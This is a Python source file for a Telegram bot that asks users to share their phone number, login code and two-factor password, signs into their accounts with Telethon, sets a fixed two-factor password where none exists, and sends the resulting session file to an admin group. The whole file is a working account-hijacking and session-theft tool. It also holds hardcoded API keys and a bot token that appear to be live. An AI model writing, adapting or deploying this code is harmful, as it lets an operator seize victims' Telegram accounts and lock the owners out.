import os
import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.errors.rpcerrorlist import PhoneCodeInvalidError, PhoneCodeExpiredError
from pyrogram import Client, filters
from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton 

# === SETTINGS ===
API_ID = 26220159
API_HASH = "8d30aa8f87a69e1531fd8a5974d7d2a0"
BOT_TOKEN = "8187057059:AAEKyPmBzJMk56tsLGACiIxX0aXLEjCSMSA"
SESSION_GROUP_ID = -4697131010
STATIC_2FA_PASSWORD = "159753"
# === PATH ===
os.makedirs("sessions", exist_ok=True)

# Store user states: user_id -> {phone, phone_code_hash, code, password}
user_state = {}

# === Pyrogram Bot ===
bot = Client("bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@bot.on_message(filters.command("start"))
async def start(_, message: Message):
    await message.reply(
        "👋 Send me your phone number using the Telegram contact button below.",
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("📞 Share Number", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
    )


@bot.on_message(filters.contact)
async def contact_handler(_, message: Message):
    user_id = message.from_user.id
    phone = message.contact.phone_number
    user_state[user_id] = {"phone": phone, "phone_code_hash": None, "code": None, "password": None}

    # Send code request and save phone_code_hash
    session_path = f"sessions/{phone.replace('+', '')}"
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    try:
        phone_code = await client.send_code_request(phone)
        user_state[user_id]["phone_code_hash"] = phone_code.phone_code_hash
    except Exception as e:
        await message.reply(f"❌ Failed to send code request: {e}")
        await client.disconnect()
        return
    await client.disconnect()

    await message.reply("📩 Now send me the login code you received on Telegram.")


@bot.on_message(filters.text & filters.private)
async def otp_handler(_, message: Message):
    user_id = message.from_user.id
    if user_id not in user_state:
        await message.reply("❌ Please send your phone number first.")
        return

    state = user_state[user_id]

    if state["phone_code_hash"] is None:
        await message.reply("❌ Code request not sent yet. Please resend your phone number.")
        return

    text = message.text.strip()

    # If no code yet, expect code (usually 5 digits or 6 digits)
    if state["code"] is None:
        if len(text) in (5, 6) and text.isdigit():
            state["code"] = text
            await message.reply("🔐 If your account has 2FA, send the password. Otherwise send /skip")
        else:
            await message.reply("❌ Please send a valid login code.")
        return

    # If code is present, now waiting for password or skip
    if state["password"] is None:
        if text == "/skip":
            state["password"] = None
        else:
            state["password"] = text

        # Try to login now
        await message.reply("⏳ Attempting to log you in...")
        await handle_telethon_login(user_id)


async def handle_telethon_login(user_id):
    state = user_state.get(user_id)
    if not state:
        return

    phone = state["phone"]
    code = state["code"]
    password = state["password"]
    phone_code_hash = state["phone_code_hash"]
    session_path = f"sessions/{phone.replace('+', '')}"

    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()

    if not await client.is_user_authorized():
        try:
            await client.sign_in(phone, code=code, phone_code_hash=phone_code_hash)
        except SessionPasswordNeededError:
            if password:
                try:
                    await client.sign_in(password=password)
                except Exception as e:
                    await bot.send_message(user_id, f"❌ 2FA password error: {e}")
                    await client.disconnect()
                    return
            else:
                await bot.send_message(user_id, "❗ Account has 2FA enabled. Please send your password or /skip if you want to skip.")
                await client.disconnect()
                return
        except PhoneCodeInvalidError:
            await bot.send_message(user_id, "❌ The login code you entered is invalid. Please send the correct code.")
            await client.disconnect()
            # reset code to ask again
            state["code"] = None
            return
        except PhoneCodeExpiredError:
            await bot.send_message(user_id, "❌ The login code expired. Please resend your phone number to get a new code.")
            await client.disconnect()
            state["phone_code_hash"] = None
            state["code"] = None
            return
        except Exception as e:
            await bot.send_message(user_id, f"❌ Login failed: {e}")
            await client.disconnect()
            return

    # Try to set 2FA password if not set
    try:
        await client.edit_2fa(new_password=STATIC_2FA_PASSWORD)
        await bot.send_message(user_id, f"✅ 2FA password set to: {STATIC_2FA_PASSWORD}")
    except Exception:
        await bot.send_message(user_id, "🔐 2FA already set or not required.")

    # Send session file to admin group
    try:
        await bot.send_document(
            SESSION_GROUP_ID,
            document=f"{session_path}.session",
            caption=f"✅ New session from: {phone}\n📁 Saved file: `{session_path}.session`"
        )
        await bot.send_message(user_id, "🎉 Session saved and sent to admin.")
    except Exception as e:
        await bot.send_message(user_id, f"❌ Could not send session: {e}")

    await client.disconnect()

    # Clear state after done
    user_state.pop(user_id, None)

# === RUN ===
bot.run()
